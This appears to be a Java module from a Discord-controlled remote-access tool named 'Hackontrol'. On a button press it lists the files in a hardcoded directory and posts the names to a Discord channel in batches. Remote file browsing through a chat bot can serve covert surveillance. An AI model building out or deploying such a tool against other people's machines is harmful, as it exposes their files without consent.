package com.khopan.hackontrol.channel.file;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

import com.khopan.hackontrol.HackontrolChannel;
import com.khopan.hackontrol.manager.button.ButtonInteraction;
import com.khopan.hackontrol.manager.button.ButtonManager;
import com.khopan.hackontrol.registry.Registry;
import com.khopan.hackontrol.utils.ErrorUtils;

import net.dv8tion.jda.api.entities.channel.unions.MessageChannelUnion;
import net.dv8tion.jda.api.events.interaction.component.ButtonInteractionEvent;
import net.dv8tion.jda.api.interactions.components.ActionRow;
import net.dv8tion.jda.api.interactions.components.buttons.ButtonStyle;
import net.dv8tion.jda.api.requests.restaction.interactions.ReplyCallbackAction;

public class FileChannel extends HackontrolChannel {
	private static final String CHANNEL_NAME = "file";

	private static final String QUERY_FILE_BUTTON_IDENTIFIER = "queryFile";

	private File filePointer;

	@Override
	public String getName() {
		return FileChannel.CHANNEL_NAME;
	}

	@Override
	public void initialize() {
		this.channel.sendMessageComponents(ActionRow.of(ButtonManager.staticButton(ButtonStyle.SUCCESS, "Query File", FileChannel.QUERY_FILE_BUTTON_IDENTIFIER))).queue();
	}

	@Override
	public void register(Registry registry) {
		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, FileChannel.QUERY_FILE_BUTTON_IDENTIFIER, this :: query);
	}

	private void query(ButtonInteraction interaction) {
		this.filePointer = new File("D:\\GitHub Repository\\");
		File[] fileList = this.filePointer == null ? File.listRoots() : this.filePointer.listFiles();
		List<String> messageList = new ArrayList<>();
		StringBuilder builder = new StringBuilder();
		builder.append("**");
		builder.append(this.filePointer == null ? "SYSTEMROOT" : this.filePointer.getAbsolutePath());
		builder.append("**");

		if(fileList != null && fileList.length > 0) {
			for(int i = 0; i < fileList.length; i++) {
				File file = fileList[i];
				String entry = "\n" + (i + 1) + ") `" + file.getName() + '`';

				if(builder.length() + entry.length() > 400) {
					messageList.add(builder.toString());
					builder = new StringBuilder();
				}

				builder.append(entry);
			}
		}

		if(!builder.isEmpty()) {
			messageList.add(builder.toString());
		}

		if(messageList.isEmpty()) {
			ErrorUtils.sendErrorReply(interaction, new InternalError("No files available"));
			return;
		}

		ButtonInteractionEvent Event = interaction.getEvent();
		MessageChannelUnion channel = Event.getChannel();
		String firstBatch = messageList.get(0);
		messageList.remove(0);
		ReplyCallbackAction action = Event.reply(firstBatch);

		if(messageList.isEmpty()) {
			action.addActionRow(ButtonManager.selfDelete(ButtonStyle.DANGER, "Delete")).queue();
			return;
		}

		action.queue(hook -> hook.retrieveOriginal().queue(message -> new Thread(() -> {
			int size = messageList.size();

			if(size == 1) {
				channel.sendMessage(messageList.get(0)).addActionRow(ButtonManager.selfDelete(ButtonStyle.DANGER, "Delete", message.getIdLong())).queue();
			} else {
				Object[] identifierList = new Object[size];
				identifierList[0] = message.getIdLong();

				for(int i = 1; i < size; i++) {
					identifierList[i] = channel.sendMessage(messageList.get(i - 1)).complete().getIdLong();
				}

				channel.sendMessage(messageList.get(size - 1)).addActionRow(ButtonManager.selfDelete(ButtonStyle.DANGER, "Delete", identifierList)).queue();
			}
		}).start()));
	}
}
